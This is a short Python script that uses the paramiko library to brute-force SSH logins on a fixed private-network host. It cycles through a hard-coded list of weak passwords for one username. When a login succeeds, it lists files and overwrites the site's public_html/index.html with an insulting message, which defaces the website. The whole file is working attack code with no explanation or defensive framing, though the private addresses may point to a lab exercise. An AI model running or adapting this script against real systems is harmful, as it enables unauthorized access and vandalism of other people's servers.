import paramiko
import sys
import socket
import time

pass_list = [
    "password",
    "p@ssword",
    "p@ssw0rd",
    "abc",
    "1234",
    "admin",
    "manager",
    "wordpress",
    "w0rdpress",
    "root",
    "i_am_a_admin"
]

for i in range(20):
    pass_list.append("dakjfuhjhdaljf")

user_list = [
    "adachi"
]

TARGET="10.1.2.1"

flag = False
for p in reversed(pass_list):
    print("trying... user:{}, pass:{}".format(user_list[0], p))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(('10.1.32.100', 0))
    sock.connect((TARGET, 22))
    
    try:
        with paramiko.SSHClient() as ssh:
            ssh.set_missing_host_key_policy(paramiko.WarningPolicy())
            ssh.connect(hostname=TARGET, username=user_list[0], password=p, sock=sock)

            print(ssh)
            _, stdout, _ = ssh.exec_command("ls -al")
            _, stdout, stderr = ssh.exec_command('echo "You are an IDIOT:)" > ./public_html/index.html')
            print(stdout.read())
            print(stderr.read())
            flag = True
    except:
        if flag:
            sys.exit()

    time.sleep(0.3)
